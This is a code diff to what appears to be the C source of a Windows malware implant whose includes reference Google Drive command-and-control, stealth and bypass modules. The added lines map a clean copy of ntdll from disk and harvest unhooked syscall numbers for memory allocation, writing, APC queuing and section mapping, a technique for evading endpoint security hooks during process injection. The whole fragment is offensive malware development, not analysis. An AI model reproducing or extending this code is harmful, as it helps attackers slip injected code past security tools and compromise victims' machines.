@@ -7,9 +7,12 @@
 #include "crypto.h"
 #include "api_hashes.h"
 #include "gdrive_c2.h"
+#include "god_mode_stealth.h"
+#include "anti_triadic.h"
+#include "clean_ssn.h"
+#include "manual_mapper.h"
 #include "advanced_bypass.h"
 #include "syscalls.h"
-#include "god_mode_stealth.h"
 
 // ===============================================================
 // Global State
@@ -56,6 +59,28 @@ static BOOL InitializeAll() {
 
     // Keep a clean reference to ntdll (optional for future checks)
     g_ApiTable.CleanNtdllBase = hNtdll;
+
+    // Optional: Upgrade to Clean SSNs from disk to bypass hooks
+    PVOID hCleanNtdll = MapCleanNtdll();
+    if (hCleanNtdll) {
+        #define VERIFY_SSN(field, hash) do { \
+            WORD cleanSsn = GetCleanSSN(hCleanNtdll, hash); \
+            if (cleanSsn != 0) g_ApiTable.syscalls.field.ssn = cleanSsn; \
+        } while (0)
+
+        VERIFY_SSN(NtAllocateVirtualMemory, HASH_NtAllocateVirtualMemory);
+        VERIFY_SSN(NtProtectVirtualMemory,  HASH_NtProtectVirtualMemory);
+        VERIFY_SSN(NtWriteVirtualMemory,    HASH_NtWriteVirtualMemory);
+        VERIFY_SSN(NtQueueApcThread,        HASH_NtQueueApcThread);
+        VERIFY_SSN(NtOpenFile,              HASH_NtOpenFile);
+        VERIFY_SSN(NtCreateSection,         HASH_NtCreateSection);
+        VERIFY_SSN(NtMapViewOfSection,      HASH_NtMapViewOfSection);
+        VERIFY_SSN(NtClose,                 HASH_NtClose);
+
+        #undef VERIFY_SSN
+        g_ApiTable.CleanNtdllBase = hCleanNtdll; // Prefer clean image base
+    }
+
     return TRUE;
 }
 
